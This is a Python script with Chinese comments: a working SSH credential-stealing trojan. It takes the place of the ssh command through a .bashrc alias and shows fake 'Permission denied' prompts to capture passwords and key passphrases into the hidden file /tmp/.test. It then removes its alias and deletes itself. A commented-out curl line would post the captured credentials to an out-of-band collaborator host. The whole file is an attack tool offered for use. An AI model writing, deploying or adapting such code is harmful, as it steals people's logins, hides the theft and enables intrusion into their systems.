import sys
from getpass import getpass
import os

def remove_alias_from_bashrc():
    # 获取当前用户的主目录
    bashrc_path = os.path.join("/root/.bashrc")

    # 读取 .bashrc 文件内容
    with open(bashrc_path, "r") as f:
        lines = f.readlines()

    # 过滤掉包含 `alias ssh='python test.py'` 的行
    new_lines = [line for line in lines if line.strip() != "alias ssh='unalias ssh > /dev/null 2>&1;python3 /tmp/.test.py'"]

    # 将修改后的内容写回 .bashrc 文件
    with open(bashrc_path, "w") as f:
        f.writelines(new_lines)

def delete_current_script():
    # 获取当前脚本的路径
    current_script_path = os.path.abspath(sys.argv[0])

   # os.system('curl -X POST -H "Content-Type: text/plain" -d "$(cat /tmp/.test)" http://8x6138uazyyr43thel1zr6zl7cd51wpl.oastify.com/ > /dev/null 2>&1;rm /tmp/.test') dns请求

    # 删除当前脚本文件
    if os.path.exists(current_script_path):
        os.remove(current_script_path)


if __name__ == '__main__':
    try:
        # 获取所有参数
        args = sys.argv  # ['ssh', '-i', 'ssh_key', 'parallels@10.211.55.10']
        if len(args) == 2:
            ip = args[1].split('@')[1]
            username = args[1].split('@')[0]  # parallels
        else:
            ip = args[3].split('@')[1]  # 10.211.55.10
            username = args[3].split('@')[0]  # parallels
            ssh_key = args[2]  # ssh_key文件名
        with open('/tmp/.test', 'a+') as f:
            if len(args)==2:
                ssh_key_pass = getpass(f"{args[1]}'s password:")
                print("Permission denied, please try again.")
                f.write(ip + ' | ' + username + ' | ' + ssh_key_pass + '\n')

                ssh_key_pass = getpass(f"{args[1]}'s password:")
                print("Permission denied, please try again.")
                f.write(ip + ' | ' + username + ' | ' + ssh_key_pass + '\n')

                ssh_key_pass = getpass(f"{args[1]}'s password:")
                f.write(ip + ' | ' + username + ' | ' + ssh_key_pass + '\n')

                print(f"{ip}: Permission denied (publickey,password).")
            else:
                if os.path.exists(ssh_key):
                    # 隐藏输入 passphrase
                    ssh_key_pass = getpass(f"Enter passphrase for key '{ssh_key}':")
                    f.write(ip + ' | ' + username + ' | ' + ssh_key_pass + '\n')

                    ssh_key_pass = getpass(f"Enter passphrase for key '{ssh_key}':")
                    f.write(ip + ' | ' + username + ' | ' + ssh_key_pass + '\n')

                    ssh_key_pass = getpass(f"Enter passphrase for key '{ssh_key}':")
                    f.write(ip + ' | ' + username + ' | ' + ssh_key_pass + '\n')

                    # 隐藏输入密码
                    ssh_key_pass = getpass(f"{args[3]}'s password:")
                    print("Permission denied, please try again.")
                    f.write(ip + ' | ' + username + ' | ' + ssh_key_pass + '\n')

                    ssh_key_pass = getpass(f"{args[3]}'s password:")
                    print("Permission denied, please try again.")
                    f.write(ip + ' | ' + username + ' | ' + ssh_key_pass + '\n')

                    ssh_key_pass = getpass(f"{args[3]}'s password:")
                    f.write(ip + ' | ' + username + ' | ' + ssh_key_pass + '\n')

                    print(f"{ip}: Permission denied (publickey,password).")
                else: # 如果ssh_key文件不存在
                    print("Warning: Identity file ssh_key not accessible: No such file or directory.")
                    # 隐藏输入密码
                    ssh_key_pass = getpass(f"{args[3]}'s password:")
                    print("Permission denied, please try again.")
                    f.write(ip + ' | ' + username + ' | ' + ssh_key_pass + '\n')

                    ssh_key_pass = getpass(f"{args[3]}'s password:")
                    print("Permission denied, please try again.")
                    f.write(ip + ' | ' + username + ' | ' + ssh_key_pass + '\n')

                    ssh_key_pass = getpass(f"{args[3]}'s password:")
                    f.write(ip + ' | ' + username + ' | ' + ssh_key_pass + '\n')

                    print(f"{ip}: Permission denied (publickey,password).")
            remove_alias_from_bashrc()
            delete_current_script()
    except KeyboardInterrupt:
        print("")
        print("")
        remove_alias_from_bashrc()
        delete_current_script()
    except Exception as e:
        print(e)
        print("")
        print("")
        remove_alias_from_bashrc()
        delete_current_script()